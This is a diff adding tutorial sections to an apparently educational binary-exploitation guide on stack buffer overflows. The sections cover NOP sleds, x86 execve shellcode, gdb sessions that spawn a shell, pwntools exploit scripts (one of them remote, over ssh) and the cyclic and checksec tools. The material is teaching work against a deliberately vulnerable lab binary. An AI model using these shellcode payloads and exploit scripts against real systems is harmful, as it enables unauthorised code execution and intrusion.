@@ -384,4 +384,287 @@ Sometimes `unset environment` helps, sometimes doesn't. You could try to brute-f
 
 ## NOP Chain
 
+At this moment, you already have a working shellcode, you know the offset, and so on. But you need somehow figure out the shellcode in the stack. Nop sled or chain will help you.
+
+NOP is an instruction that does nothing and it means NO-OPERATION. So, you can guess that simply placing this instruction at the beginning of the shellcode will help you to easily exploit the vulnerability.
+
+Let's try it:
+```bash
+gef➤  r < <(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 139 + "\xc6\xce\xff\xff"')
+
+Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow < <(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 139 + "\xc6\xce\xff\xff"')
+
+Breakpoint 1, 0x08049242 in vuln_func ()
+```
+
+```bash
+gef➤  x/50wx $esp - 0x140
+0xffffceac:	0xf7fa8580	0xffffcfe8	0xf7fe7b24	0xffffcee6
+0xffffcebc:	0x0804c000	0xf7fa8000	0xf7fa8000	0xffffcfe8
+0xffffcecc:	0x0804923a	0xffffcee6	0xffffcf20	0x00000003
+0xffffcedc:	0x08049224	0xf7ffd000	0x9090e76c	0x90909090
+0xffffceec:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffcefc:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffcf0c:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffcf1c:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffcf2c:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffcf3c:	0x90909090	0x90909090	0x90909090	0xc0319090
+0xffffcf4c:	0x2f2f6850	0x2f686873	0x896e6962	0x895350e3
+0xffffcf5c:	0xcd0bb0e1	0x41414180	0x41414141	0x41414141
+0xffffcf6c:	0x41414141	0x41414141
+gef➤  r < <(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 139 + "\x1c\xcf\xff\xff"')
+Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow < <(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 139 + "\x1c\xcf\xff\xff"')
+
+Breakpoint 1, 0x08049242 in vuln_func ()
+
+gef➤ c
+Continuing.
+process 10186 is executing new program: /bin/dash
+```
+
+Now, you see the exploit works too with the NOP chain.
+Outside gdb:
+```bash
+$ (python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*39 + "\x56\xcf\xff\xff"'; cat) | ./stack-overflow
+w
+ 16:44:33 up  2:08,  1 user,  load average: 0.43, 0.45, 0.42
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+shogun   tty7     :0               14:36    2:08m  7:11   3.52s xfce4-session
+```
+
+## Pwntools
+---
+
+Pwntools is an exploit development library. 'It is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.'
+
+With pwntools, you can connect to the remote target via ssh or just to send some data to the known port. After connection, you can execute whatever you want with proper python code.
+
+### Connect to a target
+
+If ssh login is allowed:
+```python
+from pwn import *
+
+conn = ssh(username='username', host='hostname or ip-address', password='password', port=port)
+# Then execute whatever you want
+conn.process('/bin/sh')
+conn.sendline('echo "Hello World!"')
+```
+
+If the target is open port:
+```python
+from pwn import *
+
+conn = remote('hostname or ip-address', port=PORT)
+# Receive the data from the port
+print(conn.recv())
+# Send data to the port
+print(conn.sendline('A' * 100))
+```
+
+### Remote exploit of buffer overflow with pwntools
+
+```python
+from pwn import *
+
+# Connect to target via ssh
+conn = ssh('user', 'x.x.x.x', password='pass', port=22)
+# Execute a vulnerable program
+p = conn.process('./buffer-overflow')
+# Payload
+payload = 'A' * 108 + "\xd2\x04"
+# Send payload
+p.sendline(payload)
+# To attach with gdb to remote process
+gdb.attach(p, "b *main")
+# Now, you can work with shell interactively
+p.interactive()
+```
+
+One difference here is the offset between the buffer and the valie to overwrite. This offset often can be different from the local exploit
+
+### Jump to an arbitrary address
+
+```python
+from pwn import *
+
+# Start the vuln program
+p = process('./stack-overflow')
+# Shell funtion address
+# p32 to conver an address to the little-endian format
+shell_addr = p32(0x080491d6)
+# Fill the vuln buffer
+payload = b'A' * 250
+# Add the offset
+payload += b'B' * 12
+# Add a new return address
+payload += shell_addr
+# Send to process
+p.sendline(payload)
+# Shell
+p.interactive()
+```
+
+### Write shellcode faster
+
+You can avoid writing shellcode whenever you need it. Try `shellcraft` module.
+
+```python
+from pwn import *
+
+# Specify the architecture
+context.arch = 'i386'
+# Create a shellcode
+shellcode = shellcraft.sh()
+print(shellcode)
+# Assembly it
+assembled_shellcode = asm(shellcode)
+print(assembled_shellcode)
+```
+
+Output:
+
+```bash
+$ python3 fast-shellcode.py
+    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
+    /* push b'/bin///sh\x00' */
+    push 0x68
+    push 0x732f2f2f
+    push 0x6e69622f
+    mov ebx, esp
+    /* push argument array ['sh\x00'] */
+    /* push 'sh\x00\x00' */
+    push 0x1010101
+    xor dword ptr [esp], 0x1016972
+    xor ecx, ecx
+    push ecx /* null terminate */
+    push 4
+    pop ecx
+    add ecx, esp
+    push ecx /* 'sh\x00' */
+    mov ecx, esp
+    xor edx, edx
+    /* call execve() */
+    push SYS_execve /* 0xb */
+    pop eax
+    int 0x80
+
+b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
+```
+
+Now, with this you can do stack-overflow too easy:
+
+```python
+from pwn import *
+
+
+# start the vuln program
+p = process('./stack-overflow')
+# address of the shellcode
+ret_addr = p32(0xffffcf56)
+# specify the architecture and generate the shellcode to execute /bin/sh
+context.arch = 'i386'
+shellcode = asm(shellcraft.sh())
+payload = shellcode
+# add the offset
+payload += b'A' * (262 - len(shellcode))
+# add a new return address
+payload += ret_addr
+# send to process
+p.sendline(payload)
+#gdb.attach(p, "b *main")
+# Shell
+p.interactive()
+```
+
+### Write in an assembly with pwntools shellcraft
+
+Let's code `clean-low-level-shellcode.asm` with pwntools.
+
+```python
+from pwn import *
+
+contect.arch = 'i386'
+# Just use shellcraft module and its methods which similar to assembly instruction
+shellcode = shellcraft.mov('eax', 0)
+shellcode += shellcraft.push('eax')
+shellcode += shellcraft.push(0x68732f2f)
+shellcode += shellcraft.push(0x6e69622f)
+shellcode += shellcraft.mov('ebx', 'esp')
+shellcode += shellcraft.push('eax')
+shellcode += shellcraft.push('ebx')
+shellcode += shellcraft.mov('ecx', 'esp')
+shellcode += shellcraft.mov('al', 0xb)
+shellcode += shellcraft.syscall()
+print(shellcode)
+print(asm(shellcode))
+```
+
+Output:
+```bash
+$ python3 assembly.py
+    xor eax, eax
+    push eax
+    /* push 0x68732f2f */
+    push 0x68732f2f
+    /* push 0x6e69622f */
+    push 0x6e69622f
+    mov ebx, esp
+    push eax
+    push ebx
+    mov ecx, esp
+    mov al, 0xb
+    /* call syscall() */
+    int 0x80
+
+b'1\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\xb0\x0b\xcd\x80'
+```
+
+### Tools that come with pwntools
+
+#### checksec
+
+It allows you to see the security techniques used in the binary.
+
+For instance, our `stack-overflow` program has these techniques:
+```bash
+$ checksec stack-overflow
+[*] '/home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+```
+
+#### cyclic
+
+This tool is beautiful for determining the offset before the return address. Let's try to determine the offset with it in `stack-overflow` binary.
+
+It generates a string with a set of unique patterns. 500 here is the length of the ouptut string.
+```bash
+$ cyclic 500
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae
+```
+
+Now, take the output and place it in gdb.
+```bash
+gef➤  r
+Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae
+
+Program received signal SIGSEGV, Segmentation fault.
+0x61716361 in ?? ()
+```
+
+You got the address `0x61716361`. Next, use it to determine the offset.
+```bash
+$ cyclic -l 0x61716361
+262
+```
+
+Thus, you determined the offset.
+
+It has also implementation in python programming as `cyclic(500)` and `cyclic_find(0x61716361)`.
 
